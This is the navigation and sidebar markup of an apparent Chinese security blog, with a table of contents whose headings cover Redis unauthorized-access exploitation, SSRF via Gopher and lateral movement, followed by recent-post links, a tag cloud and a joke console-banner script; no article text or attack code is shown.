<span class="toc-text">2. 网络隔离与权限控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E5%AE%9E%E8%B7%B5"><span class="toc-number">1.6.3.</span> <span class="toc-text">3. 安全编码实践</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BA%91%E7%8E%AF%E5%A2%83%E9%98%B2%E6%8A%A4"><span class="toc-number">1.6.4.</span> <span class="toc-text">4. 云环境防护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E7%9B%91%E6%8E%A7%E4%B8%8E%E6%97%A5%E5%BF%97"><span class="toc-number">1.6.5.</span> <span class="toc-text">5. 监控与日志</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E7%BB%8F%E5%85%B8%E6%A1%88%E4%BE%8B"><span class="toc-number">1.7.</span> <span class="toc-text">七、经典案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E5%B7%A5%E5%85%B7%E4%B8%8E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.8.</span> <span class="toc-text">八、工具与检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">1.9.</span> <span class="toc-text">九、总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">Redis 未授权访问漏洞详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-number">2.1.</span> <span class="toc-text">1. 漏洞背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.</span> <span class="toc-text">2. 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.3.</span> <span class="toc-text">3. 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.4.</span> <span class="toc-text">4. 漏洞利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.5.</span> <span class="toc-text">5. 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.5.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5-WebShell"><span class="toc-number">2.5.2.</span> <span class="toc-text">写入 WebShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5-SSH-%E5%85%AC%E9%92%A5"><span class="toc-number">2.5.3.</span> <span class="toc-text">写入 SSH 公钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.5.4.</span> <span class="toc-text">写入定时任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%87%BA%E7%8E%B0%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-number">2.5.5.</span> <span class="toc-text">可能会出现各种问题：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">2.6.</span> <span class="toc-text">6. 修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%80%BB%E7%BB%93"><span class="toc-number">2.7.</span> <span class="toc-text">7. 总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E7%BB%93%E5%90%88Redis%E5%88%A9%E7%94%A8"><span class="toc-number"></span> <span class="toc-text">SSRF结合Redis利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B%E9%98%B6%E6%AE%B5"><span class="toc-number">0.1.</span> <span class="toc-text">1. 漏洞探测阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E7%A1%AE%E8%AE%A4SSRF%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8"><span class="toc-number">0.1.1.</span> <span class="toc-text">1.1 确认SSRF漏洞存在</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91Redis%E6%9C%8D%E5%8A%A1"><span class="toc-number">0.1.2.</span> <span class="toc-text">1.2 探测内网Redis服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">0.2.</span> <span class="toc-text">2. 利用Redis未授权漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-PHP-%E5%86%85%E7%BD%AE-Gopher-%E5%8D%8F%E8%AE%AE%E6%94%AF%E6%8C%81%E7%9A%84%E7%89%88%E6%9C%AC%E5%B7%AE%E5%BC%82"><span class="toc-number">0.2.1.</span> <span class="toc-text">2.1 PHP 内置 Gopher 协议支持的版本差异</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E7%9A%84%E7%89%88%E6%9C%AC%E5%85%BC%E5%AE%B9%E6%80%A7"><span class="toc-number">0.2.2.</span> <span class="toc-text">攻击代码的版本兼容性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E5%88%A9%E7%94%A8Gopher%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0Redis%E5%91%BD%E4%BB%A4"><span class="toc-number">0.2.3.</span> <span class="toc-text">2.2 利用Gopher协议构造Redis命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E7%94%9F%E6%88%90Redis%E5%8D%8F%E8%AE%AEPayload"><span class="toc-number">0.2.4.</span> <span class="toc-text">2.3 生成Redis协议Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-redis%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F"><span class="toc-number">0.2.5.</span> <span class="toc-text">2.4 redis命令格式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-%E9%80%9A%E8%BF%87SSRF%E5%8F%91%E9%80%81Payload"><span class="toc-number">0.2.6.</span> <span class="toc-text">2.5 通过SSRF发送Payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="toc-number">0.3.</span> <span class="toc-text">3. 获取权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-SSH%E7%99%BB%E5%BD%95"><span class="toc-number">0.3.1.</span> <span class="toc-text">3.1 SSH登录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">0.3.2.</span> <span class="toc-text">3.2 其他利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">0.4.</span> <span class="toc-text">4. 横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">0.5.</span> <span class="toc-text">防御建议</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/5304/" title="域横向移动工具对比"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="域横向移动工具对比"/></a><div class="content"><a class="title" href="/posts/5304/" title="域横向移动工具对比">域横向移动工具对比</a><time datetime="2025-05-03T16:00:00.000Z" title="发表于 2025-05-04 00:00:00">2025-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/64101/" title="Weblogic常见安全漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/oracle-weblogic.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Weblogic常见安全漏洞"/></a><div class="content"><a class="title" href="/posts/64101/" title="Weblogic常见安全漏洞">Weblogic常见安全漏洞</a><time datetime="2025-03-29T16:00:00.000Z" title="发表于 2025-03-30 00:00:00">2025-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/8399/" title="禅道漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/zentao_logo.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="禅道漏洞"/></a><div class="content"><a class="title" href="/posts/8399/" title="禅道漏洞">禅道漏洞</a><time datetime="2025-03-29T16:00:00.000Z" title="发表于 2025-03-30 00:00:00">2025-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/56203/" title="WX小程序渗透"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/170_a_6661_52f20a56.jpg?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WX小程序渗透"/></a><div class="content"><a class="title" href="/posts/56203/" title="WX小程序渗透">WX小程序渗透</a><time datetime="2025-03-28T16:00:00.000Z" title="发表于 2025-03-29 00:00:00">2025-03-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/18454/" title="Nginx常见安全漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/nginx01.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx常见安全漏洞"/></a><div class="content"><a class="title" href="/posts/18454/" title="Nginx常见安全漏洞">Nginx常见安全漏洞</a><time datetime="2025-03-26T16:00:00.000Z" title="发表于 2025-03-27 00:00:00">2025-03-27</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/184064234.png" alt="网络安全行业初级从业者！~" title="网络安全行业初级从业者！~"/><div id="runtimeTextTip"></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2022 - 2025 By <a class="footer-bar-link" href="/" title="Takake" target="_blank">Takake</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com" title="GITHUB">GITHUB</a><a class="footer-bar-link" target="_blank" rel="noopener" href="https://chat.opengpt.lol" title="CHATGPT">CHATGPT</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">84</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">147</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">12</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://blog.takake.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https:/api.opengpt.lol/" title="GPT-API"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="GPT-API"/><span class="back-menu-item-text">GPT-API</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 站点动态</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>5</sup></a><a href="/tags/Chrome/" style="font-size: 0.88rem;">Chrome<sup>2</sup></a><a href="/tags/Fastjson/" style="font-size: 0.88rem;">Fastjson<sup>1</sup></a><a href="/tags/IPV6/" style="font-size: 0.88rem;">IPV6<sup>1</sup></a><a href="/tags/JAVA/" style="font-size: 0.88rem;">JAVA<sup>3</sup></a><a href="/tags/JAVA%E9%AB%98%E7%BA%A7/" style="font-size: 0.88rem;">JAVA高级<sup>1</sup></a><a href="/tags/JSON%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">JSON注入<sup>1</sup></a><a href="/tags/JS%E9%80%86%E5%90%91/" style="font-size: 0.88rem;">JS逆向<sup>2</sup></a><a href="/tags/NAS/" style="font-size: 0.88rem;">NAS<sup>3</sup></a><a href="/tags/NTLM/" style="font-size: 0.88rem;">NTLM<sup>2</sup></a><a href="/tags/PHP/" style="font-size: 0.88rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 0.88rem;">RCE<sup>18</sup></a><a href="/tags/cisp/" style="font-size: 0.88rem;">cisp<sup>2</sup></a><a href="/tags/esxi/" style="font-size: 0.88rem;">esxi<sup>1</sup></a><a href="/tags/hexo/" style="font-size: 0.88rem;">hexo<sup>1</sup></a><a href="/tags/html/" style="font-size: 0.88rem;">html<sup>1</sup></a><a href="/tags/javascript/" style="font-size: 0.88rem;">javascript<sup>1</sup></a><a href="/tags/kerberos/" style="font-size: 0.88rem;">kerberos<sup>1</sup></a><a href="/tags/nas/" style="font-size: 0.88rem;">nas<sup>1</sup></a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 0.88rem;">中间件<sup>15</sup></a><a href="/tags/%E4%BA%91%E5%AD%98%E5%82%A8/" style="font-size: 0.88rem;">云存储<sup>1</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>15</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 0.88rem;">博客<sup>1</sup></a><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">反序列化<sup>4</sup></a><a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">域渗透测试<sup>2</sup></a><a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 0.88rem;">实验<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 0.88rem;">密码<sup>8</sup></a><a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 0.88rem;">开发<sup>4</sup></a><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 0.88rem;">操作系统<sup>3</sup></a><a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" style="font-size: 0.88rem;">横向移动<sup>3</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">渗透测试<sup>22</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 0.88rem;">漏洞复现<sup>22</sup></a><a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 0.88rem;">硬盘<sup>1</sup></a><a href="/tags/%E7%A7%81%E6%9C%89%E4%BA%91/" style="font-size: 0.88rem;">私有云<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">网络安全<sup>10</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" style="font-size: 0.88rem;">网络配置<sup>1</sup></a><a href="/tags/%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/" style="font-size: 0.88rem;">认证机制<sup>3</sup></a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 0.88rem;">证书<sup>1</sup></a><a href="/tags/%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" style="font-size: 0.88rem;">限制绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">靶场<sup>3</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8923547078" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/#/playlist?id=8923547078&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/cdn/lib/js/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("12/01/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎来到My Blog!`,
    `生活明朗, 万物可爱`,
    `
    ████████╗ █████╗ ██╗  ██╗ █████╗ ██╗  ██╗███████╗
    ╚══██╔══╝██╔══██╗██║ ██╔╝██╔══██╗██║ ██╔╝██╔════╝
       ██║   ███████║█████╔╝ ███████║█████╔╝ █████╗  
       ██║   ██╔══██║██╔═██╗ ██╔══██║██╔═██╗ ██╔══╝  
       ██║   ██║  ██║██║  ██╗██║  ██║██║  ██╗███████╗
       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        `,
    "已上线",
    dnum,
    "天",
    "©2022 By Takake V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【骇客】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Takake 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
  var grt = new Date("12/01/2023 00:00:00"); //设置网站上线时间
  var now = new Date();
  var dnum;
  var hnum;
  var mnum;
  var snum;
  var nowHour;

  // 计算并更新天数、小时数、分钟数和秒数
  function updateTime() {
